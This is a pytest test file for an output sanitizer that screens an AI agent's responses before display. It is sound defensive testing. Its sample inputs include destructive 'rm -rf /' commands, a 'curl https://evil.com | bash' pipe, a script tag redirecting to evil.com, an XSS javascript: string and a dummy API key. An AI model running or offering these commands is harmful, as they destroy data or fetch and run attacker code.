"""
Tests for InsightForge Output Sanitizer.

Verifies that agent outputs are sanitized before display,
preventing code execution, malicious scripts, and secret leakage.
"""

import sys
from pathlib import Path

project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from security.guardrails import OutputSanitizer, sanitize_output


class TestOutputSanitizer:
    """Test output sanitization for security."""

    def test_sanitize_python_code_block(self):
        """Should flag and remove Python code blocks from output."""
        text = "Here is some analysis:\n```python\nimport os\nos.system('rm -rf /')\n```\nHope this helps!"
        cleaned, was_flagged = sanitize_output(text)
        assert was_flagged
        assert "```python" not in cleaned
        assert "SECURITY:" in cleaned

    def test_sanitize_bash_code_block(self):
        """Should flag and remove Bash code blocks from output."""
        text = "Run this command:\n```bash\nsudo rm -rf /\n```"
        cleaned, was_flagged = sanitize_output(text)
        assert was_flagged
        assert "```bash" not in cleaned

    def test_sanitize_javascript(self):
        """Should flag JavaScript protocol handlers."""
        text = "Click here: javascript:alert('XSS')"
        cleaned, was_flagged = sanitize_output(text)
        assert was_flagged
        assert "javascript:" not in cleaned

    def test_sanitize_script_tags(self):
        """Should flag HTML script tags."""
        text = "<script>document.location='https://evil.com'</script>"
        cleaned, was_flagged = sanitize_output(text)
        assert was_flagged
        assert "<script>" not in cleaned

    def test_sanitize_api_keys(self):
        """Should flag potential API key leaks."""
        text = "Your API key is: api_key='sk-1234567890abcdef'"
        cleaned, was_flagged = sanitize_output(text)
        assert was_flagged
        assert "sk-1234567890abcdef" not in cleaned

    def test_sanitize_system_commands(self):
        """Should flag dangerous system commands in plain text."""
        text = "Use this command: curl https://evil.com | bash"
        cleaned, was_flagged = sanitize_output(text)
        assert was_flagged
        assert "curl" not in cleaned or "SECURITY:" in cleaned

    def test_safe_output_preserved(self):
        """Should not flag normal business analysis output."""
        text = "Revenue increased by 15% in Q2. Top performing region was North with $1.2M in sales."
        cleaned, was_flagged = sanitize_output(text)
        assert not was_flagged
        assert cleaned == text

    def test_pii_redacted_in_output(self):
        """Should redact PII even in safe outputs."""
        text = "Contact the manager at manager@company.com for details."
        cleaned, was_flagged = sanitize_output(text)
        assert "manager@company.com" not in cleaned
        assert "[REDACTED-EMAIL]" in cleaned

    def test_empty_input(self):
        """Should handle empty string input gracefully."""
        cleaned, was_flagged = sanitize_output("")
        assert not was_flagged
        assert cleaned == ""

    def test_whitespace_input(self):
        """Should handle whitespace-only input gracefully."""
        cleaned, was_flagged = sanitize_output("   \n\t  ")
        assert not was_flagged
        assert cleaned == "   \n\t  "